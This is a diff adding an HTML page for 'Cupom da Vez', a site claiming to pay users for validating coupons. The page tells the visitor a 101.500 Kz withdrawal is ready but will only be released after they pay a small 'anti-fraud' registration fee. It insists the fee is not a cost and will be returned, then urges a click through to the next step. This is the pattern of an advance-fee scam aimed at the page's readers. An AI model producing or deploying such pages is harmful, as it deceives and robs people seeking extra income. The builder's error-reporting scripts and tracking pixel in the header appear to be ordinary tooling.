@@ -1,0 +1,275 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/vite.svg">
+    <meta name="generator" content="Hostinger Horizons">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cupom da Vez - Ganhe Dinheiro com Cupons</title>
+    <link rel="stylesheet" href="index-9d423ca4.css">
+    <script type="module">
+        window.onerror = (message, source, lineno, colno, errorObj) => {
+            const errorDetails = errorObj ? JSON.stringify({
+                name: errorObj.name,
+                message: errorObj.message,
+                stack: errorObj.stack,
+                source,
+                lineno,
+                colno,
+            }) : null;
+
+            window.parent.postMessage({
+                type: 'horizons-runtime-error',
+                message,
+                error: errorDetails
+            }, '*');
+        };
+    </script>
+    <script type="module">
+        const observer = new MutationObserver((mutations) => {
+            for (const mutation of mutations) {
+                for (const addedNode of mutation.addedNodes) {
+                    if (
+                        addedNode.nodeType === Node.ELEMENT_NODE &&
+                        (
+                            addedNode.tagName?.toLowerCase() === 'vite-error-overlay' ||
+                            addedNode.classList?.contains('backdrop')
+                        )
+                    ) {
+                        handleViteOverlay(addedNode);
+                    }
+                }
+            }
+        });
+
+        observer.observe(document.documentElement, {
+            childList: true,
+            subtree: true
+        });
+
+        function handleViteOverlay(node) {
+            if (!node.shadowRoot) {
+                return;
+            }
+
+            const backdrop = node.shadowRoot.querySelector('.backdrop');
+
+            if (backdrop) {
+                const overlayHtml = backdrop.outerHTML;
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(overlayHtml, 'text/html');
+                const messageBodyElement = doc.querySelector('.message-body');
+                const fileElement = doc.querySelector('.file');
+                const messageText = messageBodyElement ? messageBodyElement.textContent.trim() : '';
+                const fileText = fileElement ? fileElement.textContent.trim() : '';
+                const error = messageText + (fileText ? ' File:' + fileText : '');
+
+                window.parent.postMessage({
+                    type: 'horizons-vite-error',
+                    error,
+                }, '*');
+            }
+        }
+    </script>
+    <script type="module">
+        const originalConsoleError = console.error;
+        console.error = function (...args) {
+            originalConsoleError.apply(console, args);
+
+            let errorString = '';
+
+            for (let i = 0; i < args.length; i++) {
+                const arg = args[i];
+                if (arg instanceof Error) {
+                    errorString = arg.stack || `${arg.name}: ${arg.message}`;
+                    break;
+                }
+            }
+
+            if (!errorString) {
+                errorString = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ');
+            }
+
+            window.parent.postMessage({
+                type: 'horizons-console-error',
+                error: errorString
+            }, '*');
+        };
+    </script>
+    <script type="module">
+        const originalFetch = window.fetch;
+
+        window.fetch = function (...args) {
+            const url = args[0] instanceof Request ? args[0].url : args[0];
+
+            // Skip WebSocket URLs
+            if (url.startsWith('ws:') || url.startsWith('wss:')) {
+                return originalFetch.apply(this, args);
+            }
+
+            return originalFetch.apply(this, args)
+                .then(async response => {
+                    const contentType = response.headers.get('Content-Type') || '';
+
+                    // Exclude HTML document responses
+                    const isDocumentResponse =
+                        contentType.includes('text/html') ||
+                        contentType.includes('application/xhtml+xml');
+
+                    if (!response.ok && !isDocumentResponse) {
+                        const responseClone = response.clone();
+                        const errorFromRes = await responseClone.text();
+                        const requestUrl = response.url;
+                        console.error(`Fetch error from ${requestUrl}: ${errorFromRes}`);
+                    }
+
+                    return response;
+                })
+                .catch(error => {
+                    if (!url.match(/.html?$/i)) {
+                        console.error(error);
+                    }
+
+                    throw error;
+                });
+        };
+    </script>
+    <script id="utmify-pixel" async="" defer="" src="https://cdn.utmify.com.br/scripts/pixel/pixel.js"></script>
+    <meta name="description"
+        content="Participe do Cupom da Vez e ganhe dinheiro validando cupons de desconto. Sistema seguro e confiável para renda extra."
+        data-react-helmet="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" data-react-helmet="true">
+    <meta name="theme-color" content="#ffd700" data-react-helmet="true">
+</head>
+
+<body style="">
+    <div id="root">
+        <div class="mobile-container">
+            <div class="min-h-screen bg-gray-900 flex items-center justify-center p-4">
+                <div class="max-w-sm mx-auto bg-white rounded-3xl shadow-2xl overflow-hidden slide-up"
+                    style="opacity: 1; transform: none;">
+                    <div class="bg-gradient-to-r from-orange-400 to-red-500 p-6 text-center"><svg
+                            xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="w-12 h-12 text-white mx-auto mb-2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path>
+                        </svg>
+                        <h1 class="text-xl font-bold text-white">🔒 Confirmação de Segurança Necessária</h1>
+                    </div>
+                    <div class="p-6">
+                        <div class="text-center mb-6">
+                            <p class="text-gray-600 mb-2">Antes de liberar o seu saque de</p>
+                            <div class="flex items-center justify-center mb-4"><span
+                                    class="text-2xl mr-2">💰</span><span
+                                    class="text-3xl font-bold text-green-600">101.500 Kz</span></div>
+                            <p class="text-gray-600 text-sm">precisamos confirmar que você é uma pessoa real e não um
+                                robô.</p>
+                        </div>
+                        <div class="bg-gray-50 rounded-2xl p-4 mb-6" style="opacity: 1; transform: none;">
+                            <div class="flex items-start mb-3"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                    height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round"
+                                    class="w-5 h-5 text-gray-600 mr-2 mt-0.5">
+                                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path>
+                                </svg>
+                                <p class="text-sm text-gray-700">Para isso, o sistema exige um cadastro de segurança
+                                    (IBAN ou Número Express) com uma pequena taxa anti-fraude.</p>
+                            </div>
+                        </div>
+                        <div class="security-check rounded-2xl p-4 mb-6" style="opacity: 1; transform: none;">
+                            <p class="font-semibold text-gray-800 mb-3">✅ Essa verificação existe para proteger o seu
+                                dinheiro contra:</p>
+                            <div class="space-y-2">
+                                <div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                        class="w-4 h-4 text-green-600 mr-2">
+                                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                                    </svg><span class="text-sm text-gray-700">Robôs automáticos que estavam explorando o
+                                        sistema</span></div>
+                                <div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                        class="w-4 h-4 text-green-600 mr-2">
+                                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                                    </svg><span class="text-sm text-gray-700">Cadastros falsos que tentavam sacar
+                                        valores indevidos</span></div>
+                            </div>
+                        </div>
+                        <div class="warning-box rounded-2xl p-4 mb-6" style="opacity: 1; transform: none;">
+                            <div class="flex items-start mb-2"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                    height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round"
+                                    class="w-5 h-5 text-yellow-600 mr-2 mt-0.5">
+                                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z">
+                                    </path>
+                                    <path d="M12 9v4"></path>
+                                    <path d="M12 17h.01"></path>
+                                </svg><span class="font-semibold text-gray-800">Importante:</span></div>
+                            <div class="space-y-1 ml-7">
+                                <div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                        class="w-4 h-4 text-green-600 mr-2">
+                                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                                    </svg><span class="text-sm text-gray-700">Essa taxa NÃO é um custo.</span></div>
+                                <div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                        class="w-4 h-4 text-green-600 mr-2">
+                                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                                    </svg><span class="text-sm text-gray-700">Você recebe ela de volta junto com o valor
+                                        do seu saque.</span></div>
+                                <div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                                        class="w-4 h-4 text-green-600 mr-2">
+                                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                                    </svg><span class="text-sm text-gray-700">Ou seja: o que é seu, volta
+                                        garantido.</span></div>
+                            </div>
+                        </div>
+                        <div class="text-center mb-6" style="opacity: 1;">
+                            <p class="font-semibold text-gray-800 mb-2">👇 Próximo passo</p>
+                            <p class="text-sm text-gray-600">Clique no botão abaixo, ative o seu cadastro e libere agora
+                                mesmo o seu saque.</p>
+                        </div>
+                        <div tabindex="0" style="opacity: 1; transform: none;">
+                            <a href="v3.html"> <button
+                                    class="inline-flex items-center justify-center ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-primary hover:bg-primary/90 h-10 w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-4 px-6 rounded-2xl text-lg shadow-lg button-hover pulse-animation"
+                                    id="ca5f5806-50ae-00b9-3327-613a7fbae985  btn">Ativar Cadastro e Liberar
+                                    Saque</button>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
+            <ol tabindex="-1"
+                class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
+            </ol>
+        </div>
+    </div>
+    <script>
+        // Seleciona o botão pelo ID
+        const botaoCadastro = document.getElementById("ca5f5806-50ae-00b9-3327-613a7fbae985  btn");
+
+        // Adiciona o clique para redirecionar
+        if (botaoCadastro) {
+            botaoCadastro.addEventListener("click", () => {
+                window.location.href = "v3.html";
+            });
+        }
+    </script>
+
+
+
+</body>
+
+</html>
